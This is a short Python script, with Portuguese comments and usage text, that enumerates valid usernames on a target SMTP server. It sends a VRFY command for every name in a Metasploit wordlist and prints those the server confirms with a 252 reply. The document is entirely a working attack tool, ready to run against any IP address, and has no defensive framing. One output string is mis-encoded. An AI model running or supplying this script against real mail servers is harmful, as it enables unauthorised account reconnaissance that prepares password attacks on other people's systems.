import socket,sys,re,time

if len(sys.argv) != 2:
    print("exemplo: python3 brutesmtp.py 172.30.0.100")
    sys.exit()

tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
tcp.connect((sys.argv[1], 25))
banner = tcp.recv(1024)
print("Banner: " + banner.decode("utf-8"))

file = open("/usr/share/wordlists/metasploit/namelist.txt") #trocar wordlist
for i in file:
    tcp.send(('VRFY ' + i.strip() + '\r\n').encode("utf-8"))
    time.sleep(5)
    user = tcp.recv(1024)
    if re.search(r"^252", user.decode("utf-8")):
        print("Usu√°rio encontrado: " + user.decode("utf-8").strip("252 2.0.0"))
    else:
        print("Erro: " + user.decode("utf-8"))
tcp.close()
